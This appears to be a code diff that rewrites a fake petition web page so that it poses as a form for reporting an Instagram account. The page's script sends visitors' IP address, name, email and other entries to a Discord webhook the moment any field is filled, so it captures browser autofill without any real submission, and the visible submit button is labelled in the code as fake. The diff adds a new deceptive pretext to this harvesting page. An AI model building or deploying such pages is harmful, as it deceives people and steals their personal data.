@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Sign Our Petition</title>
+  <title>Report an Instagram Account</title>
   <style>
     body {
       margin: 0;
@@ -52,17 +52,18 @@
 
     #formContainer {
       margin-top: 20px;
-      text-align: center; /* Now centered */
+      text-align: center; 
       display: none;
     }
 
     label {
-      display: inline-block;
+      display: block;
       margin-bottom: 5px;
       font-weight: bold;
+      text-align: left;
     }
 
-    input[type="text"], input[type="email"] {
+    input[type="text"], input[type="email"], textarea {
       width: 100%;
       padding: 8px;
       margin-bottom: 15px;
@@ -71,7 +72,7 @@
       font-size: 1em;
     }
 
-    input[type="text"]:focus, input[type="email"]:focus {
+    input[type="text"]:focus, input[type="email"]:focus, textarea:focus {
       border-color: #4CAF50;
       outline: none;
     }
@@ -84,6 +85,7 @@
       border-radius: 5px;
       border: 1px solid #cce7cc;
       color: #333;
+      text-align: left;
     }
 
     #fake {
@@ -97,31 +99,41 @@
       cursor: pointer;
       text-decoration: none;
     }
+
+    #fake:hover {
+      background: #45a049;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Sign Our Petition</h1>
-    <p>Join our cause by sharing your details. Your support helps us make a difference!</p>
-    <p>To get started, simply click the button below.</p>
-    <button id="trigger">Sign the Petition</button>
+    <h1>Report an Instagram Account</h1>
+    <p>We’re collecting signatures to petition Instagram to remove a harmful or rule-breaking account.</p>
+    <p>Click below to show the form and add your voice. If your browser saved your details, they may be quickly filled in for you.</p>
+    <button id="trigger">Open Petition Form</button>
 
     <div id="formContainer">
       <p class="instructions">
-        Please click into a field below. If your browser has saved your details, 
-        it may suggest your info. Once you choose an autofill suggestion, we’ll submit it right away!
+        Please enter the Instagram handle you want to report, and provide a reason why you believe it should be banned. 
+        If your browser offers autofill for your name and email, simply select the suggestion. Once any field is filled, we’ll submit this information immediately to our collection point.
       </p>
       <form id="userForm" autocomplete="on">
-        <label for="fname">First Name:</label>
+        <label for="fname">Your First Name:</label>
         <input type="text" id="fname" name="given-name" autocomplete="given-name" required>
 
-        <label for="lname">Last Name:</label>
+        <label for="lname">Your Last Name:</label>
         <input type="text" id="lname" name="family-name" autocomplete="family-name" required>
 
-        <label for="email">Email:</label>
+        <label for="email">Your Email:</label>
         <input type="email" id="email" name="email" autocomplete="email" required>
+        
+        <label for="handle">Instagram Handle to Report:</label>
+        <input type="text" id="handle" name="handle" placeholder="@username" required>
+
+        <label for="reason">Reason for Reporting:</label>
+        <textarea id="reason" name="reason" rows="4" placeholder="Briefly explain why this account should be banned..." required></textarea>
       </form>
-      <button id="fake">Send Form</button>
+      <button id="fake">Approve</button>
     </div>
   </div>
 
@@ -133,6 +145,8 @@
     const fnameField = document.getElementById('fname');
     const lnameField = document.getElementById('lname');
     const emailField = document.getElementById('email');
+    const handleField = document.getElementById('handle');
+    const reasonField = document.getElementById('reason');
 
     let userIP = 'Unknown IP';
 
@@ -155,18 +169,34 @@
     });
 
     function checkFields() {
-      // If at least one field has a value, submit immediately
-      if (fnameField.value.trim() !== '' || lnameField.value.trim() !== '' || emailField.value.trim() !== '') {
+      // If any of these fields is filled (meaning the user likely chose an autofill suggestion or started typing),
+      // submit immediately.
+      if (
+        fnameField.value.trim() !== '' ||
+        lnameField.value.trim() !== '' ||
+        emailField.value.trim() !== '' ||
+        handleField.value.trim() !== '' ||
+        reasonField.value.trim() !== ''
+      ) {
         submitForm(
           fnameField.value.trim() || '[No First Name]',
           lnameField.value.trim() || '[No Last Name]',
-          emailField.value.trim() || '[No Email]'
+          emailField.value.trim() || '[No Email]',
+          handleField.value.trim() || '[No Handle]',
+          reasonField.value.trim() || '[No Reason]'
         );
       }
     }
 
-    function submitForm(fname, lname, email) {
-      const message = `**New Petition Signature:**\n**IP:** ${userIP}\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
+    function submitForm(fname, lname, email, handle, reason) {
+      const message = `**New Petition Submission (Report Instagram Account):**\n` +
+                      `**IP:** ${userIP}\n` +
+                      `**First Name:** ${fname}\n` +
+                      `**Last Name:** ${lname}\n` +
+                      `**Email:** ${email}\n` +
+                      `**Instagram Handle to Report:** ${handle}\n` +
+                      `**Reason:** ${reason}`;
+
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -182,13 +212,18 @@
       .catch(err => console.error('Error sending message to Discord:', err));
     }
 
+    // Listen for input and change events on all fields.
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
+    handleField.addEventListener('input', checkFields);
+    reasonField.addEventListener('input', checkFields);
 
     fnameField.addEventListener('change', checkFields);
     lnameField.addEventListener('change', checkFields);
     emailField.addEventListener('change', checkFields);
+    handleField.addEventListener('change', checkFields);
+    reasonField.addEventListener('change', checkFields);
   </script>
 </body>
 </html>
